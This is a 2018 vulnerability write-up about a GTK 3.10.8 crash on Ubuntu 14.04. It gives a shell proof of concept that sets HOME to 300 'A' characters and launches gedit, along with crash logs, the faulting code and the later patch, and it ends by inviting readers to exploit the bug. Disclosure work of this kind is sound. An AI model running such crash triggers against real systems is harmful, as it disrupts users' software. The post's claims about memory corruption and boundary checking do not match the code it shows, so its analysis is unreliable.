---
layout: post
title:  "LibGTK 3.10.8 - Memory Corruption"
date:   2018-09-19 03:39:03 +0700
tags:
    - memory
    - corruption
---

Vulnerability Details
---------------------
This time I will explained in details about bug / vuln found in GTK library. This bug was found few years back. It is a memory 
corruption on the filename handling upon running 'gedit' editor. Our target OS here is Ubuntu 14.04 LTS. The bug can be triggered
with a simple bash script:
```
# Proof-of-Concept - @zeifan
#!/bin/sh
echo "\nSetting the env var for HOME"
export HOME=`perl -e 'print "\x41"x300'`
echo "\nEnable core dump"
ulimit -c unlimited
echo "\nRun gedit editor to trigger the bug"
gedit
```
How does the memory corruption triggered here? First thing we need to understand how GTK library works. GTK is a multi-platform 
toolkit / library that used for creating graphical user interfaces. Gedit (text editor built for GNOME desktop). To install Gedit, it 
required gtksourceview library to extend the GTK+ text functions to include syntax highlighting. In order to install gtksoureview, it 
needs another dependency, GTK+ (i just called it GTK here) library. If we see the relation (exclude unrelated dependencies) here, 
Gedit uses a lot of GTK library for its interface purposes. 

Back to the question above, how do we achieve memory corruption here? It simple, in the bash script provided above, at first we set 
our env for $HOME by creating 300 bytes of 'A'. If we check with command "env | grep HOME", we should be able to see the $HOME path 
now are loaded with 300 character of 'A'. Gedit can be execute via terminal (load by GTK library) and provides options. Gedit can be 
execute without user permission or any specific folder. 

Beginning of execution, Gedit will grab the current $HOME variable (by default)
and execute. During execution, GTK library will takes place to execute is dependencies by parsing the filename on that environment 
variable. Upon grabbing the variable, it will check the length of filename and if it is failed to check the length, memory corruption 
will trigger. We dig out the vulnerable GTK+ library which is on version 3.10.8 (Ubuntu 14.04). 

Upon crashed, we can see the GTK print out the error and lead us to the vulnerable code. The code can be found on the gtkrecentmanager.c at the line 617. The filename 
handling can only handle until 256 bytes and if we put 260 bytes, the bug can be trigger from there. 
```
	g_assert (priv->filename != NULL);		// triggered the memory corruption. it does not even handle the proper length of filename
	file = g_file_new_for_path (priv->filename);
	error = NULL;
	priv->monitor = g_file_monitor_file (file, G_FILE_MONITOR_NONE, NULL, &error);
```
Example scenario to trigger the bug:
```
john@autobot:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.4 LTS
Release:		14.04
Codename:		trusty
john@autobot:~$ ./code.sh 

Setting the env var for HOME

Enable core dump

Run gedit editor to trigger the bug

(gedit:16877): Gtk-CRITICAL **: Unable to create user data directory 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/.local/share' for storing the recently used files list: File name too long
**
Gtk:ERROR:/build/gtk+3.0-Poe67P/gtk+3.0-3.10.8/./gtk/gtkrecentmanager.c:617:gtk_recent_manager_set_filename: assertion failed: (priv->filename != NULL)
Aborted (core dumped)
john@autobot:~$
```
I noticed the bug has been fixed in the GTK+ library version 3.20.9 which is shipped along in the Ubuntu 16.04 LTS. Testing out the 
proof of concept on the latest Ubuntu 16.04 no longer trigger the bug. Example patched:
```
john@decepticon:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.1 LTS
Release:		16.04
Codename:		xenial
john@decepticon:~$ ./code.sh 

Setting the env var for HOME

Enable core dump

Run gedit editor to trigger the bug

(gedit:16877): Gtk-CRITICAL **: Unable to create user data directory 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/.local/share' for storing the recently used files list: File name too long
**
... run as usual here ...
```
How did the developer patch their code? Since we have the source code for version 3.20.9, we can perform some code diffing to see how 
the patch is done. Developer added if-else statement on the same code (affected code) to perform boundary checking on filename before 
it gets executed. Patched code as in:
```
	if (priv->filename != NULL) // add checking on the filename to avoid memory corruption here.
    {
    	file = g_file_new_for_path (priv->filename);
        error = NULL;
    	priv->monitor = g_file_monitor_file (file, G_FILE_MONITOR_NONE, NULL, &error);
```
Well that's all for today. If you can exploit this, it will be more fun \0/ Happy hunting :)
